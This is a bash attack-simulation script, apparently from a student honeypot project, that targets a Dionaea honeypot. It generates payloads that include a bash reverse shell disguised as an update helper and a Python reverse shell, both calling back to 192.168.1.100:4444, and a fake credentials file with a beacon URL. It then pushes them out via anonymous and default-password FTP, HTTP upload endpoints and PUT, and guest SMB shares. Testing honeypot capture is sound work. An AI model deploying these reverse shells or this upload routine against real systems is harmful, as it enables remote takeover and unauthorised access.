#!/bin/bash
# Payload delivery script - simulates attacker uploading malicious files
# Targets Dionaea (FTP, HTTP, SMB) to test malware capture capability
# Creates proof-of-concept payloads and attempts upload via multiple protocols

DIONAEA="172.16.0.30"
LOGDIR="/home/kali/Desktop/fyp/attack_scripts/logs/exploitation"
PAYLOAD_DIR="/tmp/payloads_$$"

mkdir -p "$LOGDIR"
mkdir -p "$PAYLOAD_DIR"

echo "=========================================="
echo "Starting payload delivery simulation"
echo "Target: $DIONAEA"
echo "=========================================="

# Generate proof-of-concept payloads
create_payloads() {
    echo "Creating test payloads..."
    
    # Shell script payload
    cat > "$PAYLOAD_DIR/update.sh" << 'PAYLOAD'
#!/bin/bash
# System update helper
SERVER="192.168.1.100"
PORT="4444"
while true; do
    sleep 300
    /bin/bash -i >& /dev/tcp/$SERVER/$PORT 0>&1 2>/dev/null
done
PAYLOAD

    # Python reverse shell
    cat > "$PAYLOAD_DIR/service.py" << 'PAYLOAD'
#!/usr/bin/env python3
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.1.100",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
PAYLOAD

    # Config file with credentials
    cat > "$PAYLOAD_DIR/config.bak" << 'PAYLOAD'
# Backup configuration
DB_HOST=localhost
DB_USER=admin
DB_PASS=supersecret123
CALLBACK_URL=http://192.168.1.100:8080/beacon
API_KEY=FAKE_KEY_FOR_SIMULATION_ONLY
PAYLOAD

    # Binary-like payload (random data)
    head -c 2048 /dev/urandom > "$PAYLOAD_DIR/agent.bin" 2>/dev/null
    
    # Calculate and log hashes for verification
    echo "Payload hashes (for verification):" >> "$LOGDIR/payload_hashes_${DIONAEA}.txt"
    for file in "$PAYLOAD_DIR"/*; do
        if [ -f "$file" ]; then
            hash=$(md5sum "$file" | awk '{print $1}')
            name=$(basename "$file")
            echo "$name: $hash" >> "$LOGDIR/payload_hashes_${DIONAEA}.txt"
            echo "  Created: $name (MD5: $hash)"
        fi
    done
}

# FTP upload attempts
ftp_upload() {
    echo ""
    echo "[*] Attempting FTP payload upload..."
    
    if ! nc -zw2 "$DIONAEA" 21 2>/dev/null; then
        echo "[-] FTP port not open"
        return
    fi
    
    # Try anonymous upload first
    echo "[*] Trying anonymous FTP..."
    for payload in "$PAYLOAD_DIR"/*; do
        name=$(basename "$payload")
        echo "  Uploading $name via anonymous FTP..."
        
        timeout 30 curl -s -T "$payload" "ftp://$DIONAEA/$name" \
            --user "anonymous:guest@test.com" 2>&1 >> "$LOGDIR/payload_ftp_${DIONAEA}.txt"
        
        sleep $((RANDOM % 3 + 2))
    done
    
    # Try common credentials
    FTPCREDS=("ftp:ftp" "admin:admin" "user:user" "test:test")
    for cred in "${FTPCREDS[@]}"; do
        echo "[*] Trying FTP with $cred..."
        for payload in "$PAYLOAD_DIR"/*; do
            name=$(basename "$payload")
            
            timeout 30 curl -s -T "$payload" "ftp://$DIONAEA/$name" \
                --user "$cred" 2>&1 >> "$LOGDIR/payload_ftp_${DIONAEA}.txt"
            
            sleep $((RANDOM % 2 + 1))
        done
    done
    
    echo "[+] FTP upload attempts complete"
}

# HTTP upload attempts
http_upload() {
    echo ""
    echo "[*] Attempting HTTP payload upload..."
    
    if ! nc -zw2 "$DIONAEA" 80 2>/dev/null; then
        echo "[-] HTTP port not open"
        return
    fi
    
    # Common upload endpoints
    ENDPOINTS=("/upload" "/files" "/upload.php" "/api/upload" "/admin/upload")
    
    for endpoint in "${ENDPOINTS[@]}"; do
        echo "[*] Trying POST to $endpoint..."
        
        for payload in "$PAYLOAD_DIR"/*; do
            name=$(basename "$payload")
            
            # POST with form data
            timeout 15 curl -s -X POST "http://$DIONAEA$endpoint" \
                -F "file=@$payload" \
                -F "filename=$name" 2>&1 >> "$LOGDIR/payload_http_${DIONAEA}.txt"
            
            sleep $((RANDOM % 2 + 1))
        done
    done
    
    # Try PUT method
    echo "[*] Trying PUT method..."
    for payload in "$PAYLOAD_DIR"/*; do
        name=$(basename "$payload")
        
        timeout 15 curl -s -X PUT "http://$DIONAEA/$name" \
            --data-binary "@$payload" 2>&1 >> "$LOGDIR/payload_http_${DIONAEA}.txt"
        
        sleep $((RANDOM % 2 + 1))
    done
    
    echo "[+] HTTP upload attempts complete"
}

# SMB file drop
smb_upload() {
    echo ""
    echo "[*] Attempting SMB payload drop..."
    
    if ! nc -zw2 "$DIONAEA" 445 2>/dev/null; then
        echo "[-] SMB port not open"
        return
    fi
    
    # Get available shares
    echo "[*] Enumerating SMB shares..."
    smbclient -L "//$DIONAEA" -N 2>&1 | tee -a "$LOGDIR/payload_smb_${DIONAEA}.txt"
    
    # Common share names to try
    SHARES=("public" "data" "share" "files" "upload" "tmp" "IPC$")
    
    for share in "${SHARES[@]}"; do
        echo "[*] Trying to write to //$DIONAEA/$share..."
        
        for payload in "$PAYLOAD_DIR"/*; do
            name=$(basename "$payload")
            
            # Try anonymous
            timeout 30 smbclient "//$DIONAEA/$share" -N \
                -c "put $payload $name" 2>&1 >> "$LOGDIR/payload_smb_${DIONAEA}.txt"
            
            sleep $((RANDOM % 2 + 1))
        done
        
        # Try guest
        timeout 30 smbclient "//$DIONAEA/$share" -U "guest%" \
            -c "put $PAYLOAD_DIR/update.sh update.sh" 2>&1 >> "$LOGDIR/payload_smb_${DIONAEA}.txt"
    done
    
    echo "[+] SMB upload attempts complete"
}

# Main execution
echo "Starting at $(date)"
echo ""

create_payloads
sleep 3

ftp_upload
sleep 5

http_upload
sleep 5

smb_upload

# Cleanup
echo ""
echo "[*] Cleaning up local payloads..."
rm -rf "$PAYLOAD_DIR"

echo ""
echo "=========================================="
echo "Payload delivery simulation complete"
echo "Logs saved to: $LOGDIR"
echo "=========================================="
